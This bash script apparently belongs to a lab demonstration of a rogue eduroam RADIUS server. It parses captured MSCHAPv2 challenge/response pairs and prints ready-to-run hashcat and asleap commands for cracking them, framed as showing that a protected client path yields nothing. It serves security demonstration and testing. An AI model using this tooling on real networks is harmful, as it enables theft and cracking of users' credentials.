#!/usr/bin/env bash
# Reads an attacker instance's captured-hashes.log (written by the capture_hash
# overlay in setup-instances.sh) and prints, per unique capture, the crackable
# material and the two ready-to-run crack commands. Lab only; run it against
# your own test account.
#
#   lab/eduroam/radius/extract-hashes.sh [attacker-b1|attacker-b2]
#
# A capture only appears if a client COMPLETED the inner MSCHAPv2 exchange -
# i.e. trusted the rogue server certificate. The GECKO path never does, so its
# capture file stays empty: that is the result the demo shows.
set -euo pipefail

name=${1:-attacker-b1}
f="$HOME/gecko-radius/$name/captured-hashes.log"

if [ ! -s "$f" ]; then
    echo "No captures in $f"
    echo "(empty = no client completed the inner exchange. Expected for the GECKO"
    echo " scene; for the harm scene, connect with an unpinned profile and trust"
    echo " the certificate, then re-run this.)"
    exit 0
fi

echo "== captures in $f =="
sort -u "$f" | while IFS= read -r line; do
    [ -z "$line" ] && continue
    user=${line%%::::*}
    rest=${line#*::::}
    [ "$user" = "$line" ] && continue        # not our format
    resp=${rest%:*}; resp=${resp#0x}
    chal=${rest##*:}; chal=${chal#0x}
    [ -z "$resp" ] || [ -z "$chal" ] && continue
    echo
    echo "  user:      $user"
    echo "  challenge: $chal      (8-byte MSCHAPv2 challenge)"
    echo "  response:  $resp  (24-byte NT response)"
    echo "  hashcat:   echo '$user::::$resp:$chal' > hash.txt; hashcat -m 5500 hash.txt <wordlist>"
    echo "  asleap:    asleap -C $chal -R $resp -W <wordlist>"
done
echo
echo "Reset before a fresh run:  rm -f $f"
